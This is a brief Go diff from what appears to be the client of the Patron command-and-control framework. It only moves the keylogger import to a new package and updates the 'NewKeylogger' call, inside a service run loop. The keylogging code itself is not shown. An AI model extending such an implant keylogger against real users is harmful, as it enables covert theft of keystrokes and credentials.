@@ -9,7 +9,7 @@ import (
 
 	"github.com/PatronC2/Patron/Patronobuf/go/patronobuf"
 	"github.com/PatronC2/Patron/client/client_utils"
-	"github.com/PatronC2/Patron/client/client_utils/windows/keylogger"
+	"github.com/PatronC2/Patron/client/windows_utils"
 	"github.com/PatronC2/Patron/lib/common"
 	"github.com/PatronC2/Patron/lib/logger"
 	"github.com/kardianos/service"
@@ -63,7 +63,7 @@ func (p *program) run() {
 
 	client_utils.Initialize(LoggingEnabled)
 
-	keylogger := keylogger.NewKeylogger()
+	keylogger := windows_utils.NewKeylogger()
 
 	go func() {
 		for {
